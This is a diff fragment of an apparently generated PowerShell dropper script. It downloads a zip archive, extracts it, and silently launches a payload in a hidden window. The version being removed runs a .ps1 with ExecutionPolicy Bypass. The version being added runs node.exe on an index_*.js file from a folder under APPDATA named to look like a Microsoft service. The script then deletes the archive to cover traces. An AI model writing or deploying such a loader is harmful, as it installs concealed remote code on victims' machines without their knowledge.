@@ -15,16 +15,16 @@ if (-not (Test-Path `$dest)) {
 Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
 Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 
-`$ps1 = Get-ChildItem -Path "`$dest\App" -Filter "*.ps1" -Recurse -File | Select-Object -First 1
+`$folderDir = `"$env:APPDATA\Microsoft\Service\App`"
 
-if (`$ps1) {
-    Start-Process -FilePath "powershell.exe" `
-        -ArgumentList @(
-            "-NoProfile",
-            "-ExecutionPolicy", "Bypass",
-            "-File", `"`$(`$ps1.FullName)`"
-        ) `
-        -WindowStyle Hidden | Out-Null
+`$nodePath = Join-Path `$folderDir "node.exe"
+`$js = Get-ChildItem -Path `$folderDir -Filter "index_*.js" | Select-Object -First 1
+
+if (`$js) {
+    Start-Process `$nodePath `
+        -ArgumentList "`"$(`$js.FullName)`"" `
+        -WindowStyle Hidden `
+		-WorkingDirectory `$scriptDir
 }
 
 Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
